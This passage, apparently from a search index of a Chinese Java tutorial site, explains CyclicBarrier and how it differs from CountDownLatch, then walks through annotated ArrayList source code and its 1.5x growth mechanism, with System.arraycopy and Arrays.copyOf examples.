barrierAction，方便处理更复杂的业务场景。示例代码如下：\n/** * * @author SnailClimb * @date 2018年10月1日 * @Description: 新建 CyclicBarrier 的时候指定一个 Runnable */ public class CyclicBarrierExample3 { // 请求的数量  private static final int threadCount = 550; // 需要同步的线程数量  private static final CyclicBarrier cyclicBarrier = new CyclicBarrier(5, () -\u0026gt; { System.out.println(\u0026#34;------当线程数达到之后，优先执行------\u0026#34;); }); public static void main(String[] args) throws InterruptedException { // 创建线程池  ExecutorService threadPool = Executors.newFixedThreadPool(10); for (int i = 0; i \u0026lt; threadCount; i++) { final int threadNum = i; Thread.sleep(1000); threadPool.execute(() -\u0026gt; { try { test(threadNum); } catch (InterruptedException e) { // TODO Auto-generated catch block  e.printStackTrace(); } catch (BrokenBarrierException e) { // TODO Auto-generated catch block  e.printStackTrace(); } }); } threadPool.shutdown(); } public static void test(int threadnum) throws InterruptedException, BrokenBarrierException { System.out.println(\u0026#34;threadnum:\u0026#34; + threadnum + \u0026#34;is ready\u0026#34;); cyclicBarrier.await(); System.out.println(\u0026#34;threadnum:\u0026#34; + threadnum + \u0026#34;is finish\u0026#34;); } } 运行结果，如下：\nthreadnum:0is ready threadnum:1is ready threadnum:2is ready threadnum:3is ready threadnum:4is ready ------当线程数达到之后，优先执行------ threadnum:4is finish threadnum:0is finish threadnum:2is finish threadnum:1is finish threadnum:3is finish threadnum:5is ready threadnum:6is ready threadnum:7is ready threadnum:8is ready threadnum:9is ready ------当线程数达到之后，优先执行------ threadnum:9is finish threadnum:5is finish threadnum:6is finish threadnum:8is finish threadnum:7is finish ...... CyclicBarrier 源码分析    当调用 CyclicBarrier 对象调用 await() 方法时，实际上调用的是 dowait(false, 0L)方法。 await() 方法就像树立起一个栅栏的行为一样，将线程挡住了，当拦住的线程数量达到 parties 的值时，栅栏才会打开，线程才得以通过执行。\npublic int await() throws InterruptedException, BrokenBarrierException { try { return dowait(false, 0L); } catch (TimeoutException toe) { throw new Error(toe); // cannot happen  } } dowait(false, 0L)：\n// 当线程数量或者请求数量达到 count 时 await 之后的方法才会被执行。上面的示例中 count 的值就为 5。  private int count; /** * Main barrier code, covering the various policies. */ private int dowait(boolean timed, long nanos) throws InterruptedException, BrokenBarrierException, TimeoutException { final ReentrantLock lock = this.lock; // 锁住  lock.lock(); try { final Generation g = generation; if (g.broken) throw new BrokenBarrierException(); // 如果线程中断了，抛出异常  if (Thread.interrupted()) { breakBarrier(); throw new InterruptedException(); } // cout减1  int index = --count; // 当 count 数量减为 0 之后说明最后一个线程已经到达栅栏了，也就是达到了可以执行await 方法之后的条件  if (index == 0) { // tripped  boolean ranAction = false; try { final Runnable command = barrierCommand; if (command != null) command.run(); ranAction = true; // 将 count 重置为 parties 属性的初始化值  // 唤醒之前等待的线程  // 下一波执行开始  nextGeneration(); return 0; } finally { if (!ranAction) breakBarrier(); } } // loop until tripped, broken, interrupted, or timed out  for (;;) { try { if (!timed) trip.await(); else if (nanos \u0026gt; 0L) nanos = trip.awaitNanos(nanos); } catch (InterruptedException ie) { if (g == generation \u0026amp;\u0026amp; ! g.broken) { breakBarrier(); throw ie; } else { // We\u0026#39;re about to finish waiting even if we had not  // been interrupted, so this interrupt is deemed to  // \u0026#34;belong\u0026#34; to subsequent execution.  Thread.currentThread().interrupt(); } } if (g.broken) throw new BrokenBarrierException(); if (g != generation) return index; if (timed \u0026amp;\u0026amp; nanos \u0026lt;= 0L) { breakBarrier(); throw new TimeoutException(); } } } finally { lock.unlock(); } } 总结：CyclicBarrier 内部通过一个 count 变量作为计数器，count 的初始值为 parties 属性的初始化值，每当一个线程到了栅栏这里了，那么就将计数器减一。如果 count 值为 0 了，表示这是这一代最后一个线程到达栅栏，就尝试执行我们构造方法中输入的任务。\nCyclicBarrier 和 CountDownLatch 的区别    下面这个是国外一个大佬的回答：\nCountDownLatch 是计数器，只能使用一次，而 CyclicBarrier 的计数器提供 reset 功能，可以多次使用。但是我不那么认为它们之间的区别仅仅就是这么简单的一点。我们来从 jdk 作者设计的目的来看，javadoc 是这么描述它们的：\n CountDownLatch: A synchronization aid that allows one or more threads to wait until a set of operations being performed in other threads completes.(CountDownLatch: 一个或者多个线程，等待其他多个线程完成某件事情之后才能执行；) CyclicBarrier : A synchronization aid that allows a set of threads to all wait for each other to reach a common barrier point.(CyclicBarrier : 多个线程互相等待，直到到达同一个同步点，再继续一起执行。)\n 对于 CountDownLatch 来说，重点是“一个线程（多个线程）等待”，而其他的 N 个线程在完成“某件事情”之后，可以终止，也可以等待。而对于 CyclicBarrier，重点是多个线程，在任意一个线程没有完成，所有的线程都必须等待。\nCountDownLatch 是计数器，线程完成一个记录一个，只不过计数不是递增而是递减，而 CyclicBarrier 更像是一个阀门，需要所有线程都到达，阀门才能打开，然后继续执行。\nReentrantLock 和 ReentrantReadWriteLock    ReentrantLock 和 synchronized 的区别在上面已经讲过了这里就不多做讲解。另外，需要注意的是：读写锁 ReentrantReadWriteLock 可以保证多个线程可以同时读，所以在读操作远大于写操作的时候，读写锁就非常有用了。\n"},{"id":132,"href":"/java/collection/ArrayList%E6%BA%90%E7%A0%81+%E6%89%A9%E5%AE%B9%E6%9C%BA%E5%88%B6%E5%88%86%E6%9E%90/","title":"ArrayList源码+扩容机制分析","parent":"collection","content":"1. ArrayList 简介    ArrayList 的底层是数组队列，相当于动态数组。与 Java 中的数组相比，它的容量能动态增长。在添加大量元素前，应用程序可以使用ensureCapacity操作来增加 ArrayList 实例的容量。这可以减少递增式再分配的数量。\nArrayList继承于 AbstractList ，实现了 List, RandomAccess, Cloneable, java.io.Serializable 这些接口。\npublic class ArrayList\u0026lt;E\u0026gt; extends AbstractList\u0026lt;E\u0026gt; implements List\u0026lt;E\u0026gt;, RandomAccess, Cloneable, java.io.Serializable{ }  RandomAccess 是一个标志接口，表明实现这个这个接口的 List 集合是支持快速随机访问的。在 ArrayList 中，我们即可以通过元素的序号快速获取元素对象，这就是快速随机访问。 ArrayList 实现了 Cloneable 接口 ，即覆盖了函数clone()，能被克隆。 ArrayList 实现了 java.io.Serializable接口，这意味着ArrayList支持序列化，能通过序列化去传输。  1.1. Arraylist 和 Vector 的区别?     ArrayList 是 List 的主要实现类，底层使用 Object[ ]存储，适用于频繁的查找工作，线程不安全 ； Vector 是 List 的古老实现类，底层使用 Object[ ]存储，线程安全的。  1.2. Arraylist 与 LinkedList 区别?     是否保证线程安全： ArrayList 和 LinkedList 都是不同步的，也就是不保证线程安全； 底层数据结构： Arraylist 底层使用的是 Object 数组；LinkedList 底层使用的是 双向链表 数据结构（JDK1.6 之前为循环链表，JDK1.7 取消了循环。注意双向链表和双向循环链表的区别，下面有介绍到！） 插入和删除是否受元素位置的影响： ① ArrayList 采用数组存储，所以插入和删除元素的时间复杂度受元素位置的影响。 比如：执行add(E e)方法的时候， ArrayList 会默认在将指定的元素追加到此列表的末尾，这种情况时间复杂度就是 O(1)。但是如果要在指定位置 i 插入和删除元素的话（add(int index, E element)）时间复杂度就为 O(n-i)。因为在进行上述操作的时候集合中第 i 和第 i 个元素之后的(n-i)个元素都要执行向后位/向前移一位的操作。 ② LinkedList 采用链表存储，所以对于add(E e)方法的插入，删除元素时间复杂度不受元素位置的影响，近似 O(1)，如果是要在指定位置i插入和删除元素的话（(add(int index, E element)） 时间复杂度近似为o(n))因为需要先移动到指定位置再插入。 是否支持快速随机访问： LinkedList 不支持高效的随机元素访问，而 ArrayList 支持。快速随机访问就是通过元素的序号快速获取元素对象(对应于get(int index)方法)。 内存空间占用： ArrayList 的空 间浪费主要体现在在 list 列表的结尾会预留一定的容量空间，而 LinkedList 的空间花费则体现在它的每一个元素都需要消耗比 ArrayList 更多的空间（因为要存放直接后继和直接前驱以及数据）。  2. ArrayList 核心源码解读    package java.util; import java.util.function.Consumer; import java.util.function.Predicate; import java.util.function.UnaryOperator; public class ArrayList\u0026lt;E\u0026gt; extends AbstractList\u0026lt;E\u0026gt; implements List\u0026lt;E\u0026gt;, RandomAccess, Cloneable, java.io.Serializable { private static final long serialVersionUID = 8683452581122892189L; /** * 默认初始容量大小 */ private static final int DEFAULT_CAPACITY = 10; /** * 空数组（用于空实例）。 */ private static final Object[] EMPTY_ELEMENTDATA = {}; //用于默认大小空实例的共享空数组实例。  //我们把它从EMPTY_ELEMENTDATA数组中区分出来，以知道在添加第一个元素时容量需要增加多少。  private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {}; /** * 保存ArrayList数据的数组 */ transient Object[] elementData; // non-private to simplify nested class access  /** * ArrayList 所包含的元素个数 */ private int size; /** * 带初始容量参数的构造函数（用户可以在创建ArrayList对象时自己指定集合的初始大小） */ public ArrayList(int initialCapacity) { if (initialCapacity \u0026gt; 0) { //如果传入的参数大于0，创建initialCapacity大小的数组  this.elementData = new Object[initialCapacity]; } else if (initialCapacity == 0) { //如果传入的参数等于0，创建空数组  this.elementData = EMPTY_ELEMENTDATA; } else { //其他情况，抛出异常  throw new IllegalArgumentException(\u0026#34;Illegal Capacity: \u0026#34;+ initialCapacity); } } /** *默认无参构造函数 *DEFAULTCAPACITY_EMPTY_ELEMENTDATA 为0.初始化为10，也就是说初始其实是空数组 当添加第一个元素的时候数组容量才变成10 */ public ArrayList() { this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA; } /** * 构造一个包含指定集合的元素的列表，按照它们由集合的迭代器返回的顺序。 */ public ArrayList(Collection\u0026lt;? extends E\u0026gt; c) { //将指定集合转换为数组  elementData = c.toArray(); //如果elementData数组的长度不为0  if ((size = elementData.length) != 0) { // 如果elementData不是Object类型数据（c.toArray可能返回的不是Object类型的数组所以加上下面的语句用于判断）  if (elementData.getClass() != Object[].class) //将原来不是Object类型的elementData数组的内容，赋值给新的Object类型的elementData数组  elementData = Arrays.copyOf(elementData, size, Object[].class); } else { // 其他情况，用空数组代替  this.elementData = EMPTY_ELEMENTDATA; } } /** * 修改这个ArrayList实例的容量是列表的当前大小。 应用程序可以使用此操作来最小化ArrayList实例的存储。 */ public void trimToSize() { modCount++; if (size \u0026lt; elementData.length) { elementData = (size == 0) ? EMPTY_ELEMENTDATA : Arrays.copyOf(elementData, size); } } //下面是ArrayList的扩容机制 //ArrayList的扩容机制提高了性能，如果每次只扩充一个， //那么频繁的插入会导致频繁的拷贝，降低性能，而ArrayList的扩容机制避免了这种情况。  /** * 如有必要，增加此ArrayList实例的容量，以确保它至少能容纳元素的数量 * @param minCapacity 所需的最小容量 */ public void ensureCapacity(int minCapacity) { //如果是true，minExpand的值为0，如果是false,minExpand的值为10  int minExpand = (elementData != DEFAULTCAPACITY_EMPTY_ELEMENTDATA) // any size if not default element table  ? 0 // larger than default for default empty table. It\u0026#39;s already  // supposed to be at default size.  : DEFAULT_CAPACITY; //如果最小容量大于已有的最大容量  if (minCapacity \u0026gt; minExpand) { ensureExplicitCapacity(minCapacity); } } //得到最小扩容量  private void ensureCapacityInternal(int minCapacity) { if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) { // 获取“默认的容量”和“传入参数”两者之间的最大值  minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); } ensureExplicitCapacity(minCapacity); } //判断是否需要扩容  private void ensureExplicitCapacity(int minCapacity) { modCount++; // overflow-conscious code  if (minCapacity - elementData.length \u0026gt; 0) //调用grow方法进行扩容，调用此方法代表已经开始扩容了  grow(minCapacity); } /** * 要分配的最大数组大小 */ private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8; /** * ArrayList扩容的核心方法。 */ private void grow(int minCapacity) { // oldCapacity为旧容量，newCapacity为新容量  int oldCapacity = elementData.length; //将oldCapacity 右移一位，其效果相当于oldCapacity /2，  //我们知道位运算的速度远远快于整除运算，整句运算式的结果就是将新容量更新为旧容量的1.5倍，  int newCapacity = oldCapacity + (oldCapacity \u0026gt;\u0026gt; 1); //然后检查新容量是否大于最小需要容量，若还是小于最小需要容量，那么就把最小需要容量当作数组的新容量，  if (newCapacity - minCapacity \u0026lt; 0) newCapacity = minCapacity; //再检查新容量是否超出了ArrayList所定义的最大容量，  //若超出了，则调用hugeCapacity()来比较minCapacity和 MAX_ARRAY_SIZE，  //如果minCapacity大于MAX_ARRAY_SIZE，则新容量则为Interger.MAX_VALUE，否则，新容量大小则为 MAX_ARRAY_SIZE。  if (newCapacity - MAX_ARRAY_SIZE \u0026gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win:  elementData = Arrays.copyOf(elementData, newCapacity); } //比较minCapacity和 MAX_ARRAY_SIZE  private static int hugeCapacity(int minCapacity) { if (minCapacity \u0026lt; 0) // overflow  throw new OutOfMemoryError(); return (minCapacity \u0026gt; MAX_ARRAY_SIZE) ? Integer.MAX_VALUE : MAX_ARRAY_SIZE; } /** *返回此列表中的元素数。 */ public int size() { return size; } /** * 如果此列表不包含元素，则返回 true 。 */ public boolean isEmpty() { //注意=和==的区别  return size == 0; } /** * 如果此列表包含指定的元素，则返回true 。 */ public boolean contains(Object o) { //indexOf()方法：返回此列表中指定元素的首次出现的索引，如果此列表不包含此元素，则为-1  return indexOf(o) \u0026gt;= 0; } /** *返回此列表中指定元素的首次出现的索引，如果此列表不包含此元素，则为-1 */ public int indexOf(Object o) { if (o == null) { for (int i = 0; i \u0026lt; size; i++) if (elementData[i]==null) return i; } else { for (int i = 0; i \u0026lt; size; i++) //equals()方法比较  if (o.equals(elementData[i])) return i; } return -1; } /** * 返回此列表中指定元素的最后一次出现的索引，如果此列表不包含元素，则返回-1。. */ public int lastIndexOf(Object o) { if (o == null) { for (int i = size-1; i \u0026gt;= 0; i--) if (elementData[i]==null) return i; } else { for (int i = size-1; i \u0026gt;= 0; i--) if (o.equals(elementData[i])) return i; } return -1; } /** * 返回此ArrayList实例的浅拷贝。 （元素本身不被复制。） */ public Object clone() { try { ArrayList\u0026lt;?\u0026gt; v = (ArrayList\u0026lt;?\u0026gt;) super.clone(); //Arrays.copyOf功能是实现数组的复制，返回复制后的数组。参数是被复制的数组和复制的长度  v.elementData = Arrays.copyOf(elementData, size); v.modCount = 0; return v; } catch (CloneNotSupportedException e) { // 这不应该发生，因为我们是可以克隆的  throw new InternalError(e); } } /** *以正确的顺序（从第一个到最后一个元素）返回一个包含此列表中所有元素的数组。 *返回的数组将是“安全的”，因为该列表不保留对它的引用。 （换句话说，这个方法必须分配一个新的数组）。 *因此，调用者可以自由地修改返回的数组。 此方法充当基于阵列和基于集合的API之间的桥梁。 */ public Object[] toArray() { return Arrays.copyOf(elementData, size); } /** * 以正确的顺序返回一个包含此列表中所有元素的数组（从第一个到最后一个元素）; *返回的数组的运行时类型是指定数组的运行时类型。 如果列表适合指定的数组，则返回其中。 *否则，将为指定数组的运行时类型和此列表的大小分配一个新数组。 *如果列表适用于指定的数组，其余空间（即数组的列表数量多于此元素），则紧跟在集合结束后的数组中的元素设置为null 。 *（这仅在调用者知道列表不包含任何空元素的情况下才能确定列表的长度。） */ @SuppressWarnings(\u0026#34;unchecked\u0026#34;) public \u0026lt;T\u0026gt; T[] toArray(T[] a) { if (a.length \u0026lt; size) // 新建一个运行时类型的数组，但是ArrayList数组的内容  return (T[]) Arrays.copyOf(elementData, size, a.getClass()); //调用System提供的arraycopy()方法实现数组之间的复制  System.arraycopy(elementData, 0, a, 0, size); if (a.length \u0026gt; size) a[size] = null; return a; } // Positional Access Operations  @SuppressWarnings(\u0026#34;unchecked\u0026#34;) E elementData(int index) { return (E) elementData[index]; } /** * 返回此列表中指定位置的元素。 */ public E get(int index) { rangeCheck(index); return elementData(index); } /** * 用指定的元素替换此列表中指定位置的元素。 */ public E set(int index, E element) { //对index进行界限检查  rangeCheck(index); E oldValue = elementData(index); elementData[index] = element; //返回原来在这个位置的元素  return oldValue; } /** * 将指定的元素追加到此列表的末尾。 */ public boolean add(E e) { ensureCapacityInternal(size + 1); // Increments modCount!!  //这里看到ArrayList添加元素的实质就相当于为数组赋值  elementData[size++] = e; return true; } /** * 在此列表中的指定位置插入指定的元素。 *先调用 rangeCheckForAdd 对index进行界限检查；然后调用 ensureCapacityInternal 方法保证capacity足够大； *再将从index开始之后的所有成员后移一个位置；将element插入index位置；最后size加1。 */ public void add(int index, E element) { rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!!  //arraycopy()这个实现数组之间复制的方法一定要看一下，下面就用到了arraycopy()方法实现数组自己复制自己  System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++; } /** * 删除该列表中指定位置的元素。 将任何后续元素移动到左侧（从其索引中减去一个元素）。 */ public E remove(int index) { rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved \u0026gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work  //从列表中删除的元素  return oldValue; } /** * 从列表中删除指定元素的第一个出现（如果存在）。 如果列表不包含该元素，则它不会更改。 *返回true，如果此列表包含指定的元素 */ public boolean remove(Object o) { if (o == null) { for (int index = 0; index \u0026lt; size; index++) if (elementData[index] == null) { fastRemove(index); return true; } } else { for (int index = 0; index \u0026lt; size; index++) if (o.equals(elementData[index])) { fastRemove(index); return true; } } return false; } /* * Private remove method that skips bounds checking and does not * return the value removed. */ private void fastRemove(int index) { modCount++; int numMoved = size - index - 1; if (numMoved \u0026gt; 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work  } /** * 从列表中删除所有元素。 */ public void clear() { modCount++; // 把数组中所有的元素的值设为null  for (int i = 0; i \u0026lt; size; i++) elementData[i] = null; size = 0; } /** * 按指定集合的Iterator返回的顺序将指定集合中的所有元素追加到此列表的末尾。 */ public boolean addAll(Collection\u0026lt;? extends E\u0026gt; c) { Object[] a = c.toArray(); int numNew = a.length; ensureCapacityInternal(size + numNew); // Increments modCount  System.arraycopy(a, 0, elementData, size, numNew); size += numNew; return numNew != 0; } /** * 将指定集合中的所有元素插入到此列表中，从指定的位置开始。 */ public boolean addAll(int index, Collection\u0026lt;? extends E\u0026gt; c) { rangeCheckForAdd(index); Object[] a = c.toArray(); int numNew = a.length; ensureCapacityInternal(size + numNew); // Increments modCount  int numMoved = size - index; if (numMoved \u0026gt; 0) System.arraycopy(elementData, index, elementData, index + numNew, numMoved); System.arraycopy(a, 0, elementData, index, numNew); size += numNew; return numNew != 0; } /** * 从此列表中删除所有索引为fromIndex （含）和toIndex之间的元素。 *将任何后续元素移动到左侧（减少其索引）。 */ protected void removeRange(int fromIndex, int toIndex) { modCount++; int numMoved = size - toIndex; System.arraycopy(elementData, toIndex, elementData, fromIndex, numMoved); // clear to let GC do its work  int newSize = size - (toIndex-fromIndex); for (int i = newSize; i \u0026lt; size; i++) { elementData[i] = null; } size = newSize; } /** * 检查给定的索引是否在范围内。 */ private void rangeCheck(int index) { if (index \u0026gt;= size) throw new IndexOutOfBoundsException(outOfBoundsMsg(index)); } /** * add和addAll使用的rangeCheck的一个版本 */ private void rangeCheckForAdd(int index) { if (index \u0026gt; size || index \u0026lt; 0) throw new IndexOutOfBoundsException(outOfBoundsMsg(index)); } /** * 返回IndexOutOfBoundsException细节信息 */ private String outOfBoundsMsg(int index) { return \u0026#34;Index: \u0026#34;+index+\u0026#34;, Size: \u0026#34;+size; } /** * 从此列表中删除指定集合中包含的所有元素。 */ public boolean removeAll(Collection\u0026lt;?\u0026gt; c) { Objects.requireNonNull(c); //如果此列表被修改则返回true  return batchRemove(c, false); } /** * 仅保留此列表中包含在指定集合中的元素。 *换句话说，从此列表中删除其中不包含在指定集合中的所有元素。 */ public boolean retainAll(Collection\u0026lt;?\u0026gt; c) { Objects.requireNonNull(c); return batchRemove(c, true); } /** * 从列表中的指定位置开始，返回列表中的元素（按正确顺序）的列表迭代器。 *指定的索引表示初始调用将返回的第一个元素为next 。 初始调用previous将返回指定索引减1的元素。 *返回的列表迭代器是fail-fast 。 */ public ListIterator\u0026lt;E\u0026gt; listIterator(int index) { if (index \u0026lt; 0 || index \u0026gt; size) throw new IndexOutOfBoundsException(\u0026#34;Index: \u0026#34;+index); return new ListItr(index); } /** *返回列表中的列表迭代器（按适当的顺序）。 *返回的列表迭代器是fail-fast 。 */ public ListIterator\u0026lt;E\u0026gt; listIterator() { return new ListItr(0); } /** *以正确的顺序返回该列表中的元素的迭代器。 *返回的迭代器是fail-fast 。 */ public Iterator\u0026lt;E\u0026gt; iterator() { return new Itr(); } 3. ArrayList 扩容机制分析    3.1. 先从 ArrayList 的构造函数说起    （JDK8）ArrayList 有三种方式来初始化，构造方法源码如下：\n/** * 默认初始容量大小 */ private static final int DEFAULT_CAPACITY = 10; private static final Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA = {}; /** *默认构造函数，使用初始容量10构造一个空列表(无参数构造) */ public ArrayList() { this.elementData = DEFAULTCAPACITY_EMPTY_ELEMENTDATA; } /** * 带初始容量参数的构造函数。（用户自己指定容量） */ public ArrayList(int initialCapacity) { if (initialCapacity \u0026gt; 0) {//初始容量大于0  //创建initialCapacity大小的数组  this.elementData = new Object[initialCapacity]; } else if (initialCapacity == 0) {//初始容量等于0  //创建空数组  this.elementData = EMPTY_ELEMENTDATA; } else {//初始容量小于0，抛出异常  throw new IllegalArgumentException(\u0026#34;Illegal Capacity: \u0026#34;+ initialCapacity); } } /** *构造包含指定collection元素的列表，这些元素利用该集合的迭代器按顺序返回 *如果指定的集合为null，throws NullPointerException。 */ public ArrayList(Collection\u0026lt;? extends E\u0026gt; c) { elementData = c.toArray(); if ((size = elementData.length) != 0) { // c.toArray might (incorrectly) not return Object[] (see 6260652)  if (elementData.getClass() != Object[].class) elementData = Arrays.copyOf(elementData, size, Object[].class); } else { // replace with empty array.  this.elementData = EMPTY_ELEMENTDATA; } } 细心的同学一定会发现 ：以无参数构造方法创建 ArrayList 时，实际上初始化赋值的是一个空数组。当真正对数组进行添加元素操作时，才真正分配容量。即向数组中添加第一个元素时，数组容量扩为 10。 下面在我们分析 ArrayList 扩容时会讲到这一点内容！\n 补充：JDK6 new 无参构造的 ArrayList 对象时，直接创建了长度是 10 的 Object[] 数组 elementData 。\n 3.2. 一步一步分析 ArrayList 扩容机制    这里以无参构造函数创建的 ArrayList 为例分析\n3.2.1. 先来看 add 方法    /** * 将指定的元素追加到此列表的末尾。 */ public boolean add(E e) { //添加元素之前，先调用ensureCapacityInternal方法  ensureCapacityInternal(size + 1); // Increments modCount!!  //这里看到ArrayList添加元素的实质就相当于为数组赋值  elementData[size++] = e; return true; }  注意 ：JDK11 移除了 ensureCapacityInternal() 和 ensureExplicitCapacity() 方法\n 3.2.2. 再来看看 ensureCapacityInternal() 方法    （JDK7）可以看到 add 方法 首先调用了ensureCapacityInternal(size + 1)\n//得到最小扩容量  private void ensureCapacityInternal(int minCapacity) { if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) { // 获取默认的容量和传入参数的较大值  minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); } ensureExplicitCapacity(minCapacity); } 当 要 add 进第 1 个元素时，minCapacity 为 1，在 Math.max()方法比较后，minCapacity 为 10。\n 此处和后续 JDK8 代码格式化略有不同，核心代码基本一样。\n 3.2.3. ensureExplicitCapacity() 方法    如果调用 ensureCapacityInternal() 方法就一定会进入（执行）这个方法，下面我们来研究一下这个方法的源码！\n//判断是否需要扩容  private void ensureExplicitCapacity(int minCapacity) { modCount++; // overflow-conscious code  if (minCapacity - elementData.length \u0026gt; 0) //调用grow方法进行扩容，调用此方法代表已经开始扩容了  grow(minCapacity); } 我们来仔细分析一下：\n 当我们要 add 进第 1 个元素到 ArrayList 时，elementData.length 为 0 （因为还是一个空的 list），因为执行了 ensureCapacityInternal() 方法 ，所以 minCapacity 此时为 10。此时，minCapacity - elementData.length \u0026gt; 0成立，所以会进入 grow(minCapacity) 方法。 当 add 第 2 个元素时，minCapacity 为 2，此时 e lementData.length(容量)在添加第一个元素后扩容成 10 了。此时，minCapacity - elementData.length \u0026gt; 0 不成立，所以不会进入 （执行）grow(minCapacity) 方法。 添加第 3、4···到第 10 个元素时，依然不会执行 grow 方法，数组容量都为 10。  直到添加第 11 个元素，minCapacity(为 11)比 elementData.length（为 10）要大。进入 grow 方法进行扩容。\n3.2.4. grow() 方法    /** * 要分配的最大数组大小 */ private static final int MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8; /** * ArrayList扩容的核心方法。 */ private void grow(int minCapacity) { // oldCapacity为旧容量，newCapacity为新容量  int oldCapacity = elementData.length; //将oldCapacity 右移一位，其效果相当于oldCapacity /2，  //我们知道位运算的速度远远快于整除运算，整句运算式的结果就是将新容量更新为旧容量的1.5倍，  int newCapacity = oldCapacity + (oldCapacity \u0026gt;\u0026gt; 1); //然后检查新容量是否大于最小需要容量，若还是小于最小需要容量，那么就把最小需要容量当作数组的新容量，  if (newCapacity - minCapacity \u0026lt; 0) newCapacity = minCapacity; // 如果新容量大于 MAX_ARRAY_SIZE,进入(执行) `hugeCapacity()` 方法来比较 minCapacity 和 MAX_ARRAY_SIZE，  //如果minCapacity大于最大容量，则新容量则为`Integer.MAX_VALUE`，否则，新容量大小则为 MAX_ARRAY_SIZE 即为 `Integer.MAX_VALUE - 8`。  if (newCapacity - MAX_ARRAY_SIZE \u0026gt; 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win:  elementData = Arrays.copyOf(elementData, newCapacity); } int newCapacity = oldCapacity + (oldCapacity \u0026raquo; 1),所以 ArrayList 每次扩容之后容量都会变为原来的 1.5 倍左右（oldCapacity 为偶数就是 1.5 倍，否则是 1.5 倍左右）！ 奇偶不同，比如 ：10+10/2 = 15, 33+33/2=49。如果是奇数的话会丢掉小数.\n \u0026ldquo;\u0026raquo;\u0026quot;（移位运算符）：\u0026raquo;1 右移一位相当于除 2，右移 n 位相当于除以 2 的 n 次方。这里 oldCapacity 明显右移了 1 位所以相当于 oldCapacity /2。对于大数据的 2 进制运算,位移运算符比那些普通运算符的运算要快很多,因为程序仅仅移动一下而已,不去计算,这样提高了效率,节省了资源\n 我们再来通过例子探究一下grow() 方法 ：\n 当 add 第 1 个元素时，oldCapacity 为 0，经比较后第一个 if 判断成立，newCapacity = minCapacity(为 10)。但是第二个 if 判断不会成立，即 newCapacity 不比 MAX_ARRAY_SIZE 大，则不会进入 hugeCapacity 方法。数组容量为 10，add 方法中 return true,size 增为 1。 当 add 第 11 个元素进入 grow 方法时，newCapacity 为 15，比 minCapacity（为 11）大，第一个 if 判断不成立。新容量没有大于数组最大 size，不会进入 hugeCapacity 方法。数组容量扩为 15，add 方法中 return true,size 增为 11。 以此类推······  这里补充一点比较重要，但是容易被忽视掉的知识点：\n java 中的 length属性是针对数组说的,比如说你声明了一个数组,想知道这个数组的长度则用到了 length 这个属性. java 中的 length() 方法是针对字符串说的,如果想看这个字符串的长度则用到 length() 这个方法. java 中的 size() 方法是针对泛型集合说的,如果想看这个泛型有多少个元素,就调用此方法来查看!  3.2.5. hugeCapacity() 方法。    从上面 grow() 方法源码我们知道： 如果新容量大于 MAX_ARRAY_SIZE,进入(执行) hugeCapacity() 方法来比较 minCapacity 和 MAX_ARRAY_SIZE，如果 minCapacity 大于最大容量，则新容量则为Integer.MAX_VALUE，否则，新容量大小则为 MAX_ARRAY_SIZE 即为 Integer.MAX_VALUE - 8。\nprivate static int hugeCapacity(int minCapacity) { if (minCapacity \u0026lt; 0) // overflow  throw new OutOfMemoryError(); //对minCapacity和MAX_ARRAY_SIZE进行比较  //若minCapacity大，将Integer.MAX_VALUE作为新数组的大小  //若MAX_ARRAY_SIZE大，将MAX_ARRAY_SIZE作为新数组的大小  //MAX_ARRAY_SIZE = Integer.MAX_VALUE - 8;  return (minCapacity \u0026gt; MAX_ARRAY_SIZE) ? Integer.MAX_VALUE : MAX_ARRAY_SIZE; } 3.3. System.arraycopy() 和 Arrays.copyOf()方法    阅读源码的话，我们就会发现 ArrayList 中大量调用了这两个方法。比如：我们上面讲的扩容操作以及add(int index, E element)、toArray() 等方法中都用到了该方法！\n3.3.1. System.arraycopy() 方法    源码：\n// 我们发现 arraycopy 是一个 native 方法,接下来我们解释一下各个参数的具体意义  /** * 复制数组 * @param src 源数组 * @param srcPos 源数组中的起始位置 * @param dest 目标数组 * @param destPos 目标数组中的起始位置 * @param length 要复制的数组元素的数量 */ public static native void arraycopy(Object src, int srcPos, Object dest, int destPos, int length); 场景：\n/** * 在此列表中的指定位置插入指定的元素。 *先调用 rangeCheckForAdd 对index进行界限检查；然后调用 ensureCapacityInternal 方法保证capacity足够大； *再将从index开始之后的所有成员后移一个位置；将element插入index位置；最后size加1。 */ public void add(int index, E element) { rangeCheckForAdd(index); ensureCapacityInternal(size + 1); // Increments modCount!!  //arraycopy()方法实现数组自己复制自己  //elementData:源数组;index:源数组中的起始位置;elementData：目标数组；index + 1：目标数组中的起始位置； size - index：要复制的数组元素的数量；  System.arraycopy(elementData, index, elementData, index + 1, size - index); elementData[index] = element; size++; } 我们写一个简单的方法测试以下：\npublic class ArraycopyTest { public static void main(String[] args) { // TODO Auto-generated method stub \tint[] a = new int[10]; a[0] = 0; a[1] = 1; a[2] = 2; a[3] = 3; System.arraycopy(a, 2, a, 3, 3); a[2]=99; for (int i = 0; i \u0026lt; a.length; i++) { System.out.print(a[i] + \u0026#34; \u0026#34;); } } } 结果：\n0 1 99 2 3 0 0 0 0 0 3.3.2. Arrays.copyOf()方法    源码：\npublic static int[] copyOf(int[] original, int newLength) { // 申请一个新的数组  int[] copy = new int[newLength]; // 调用System.arraycopy,将源数组中的数据进行拷贝,并返回新的数组  System.arraycopy(original, 0, copy, 0, Math.min(original.length, newLength)); return copy; } 场景：\n/** 以正确的顺序返回一个包含此列表中所有元素的数组（从第一个到最后一个元素）; 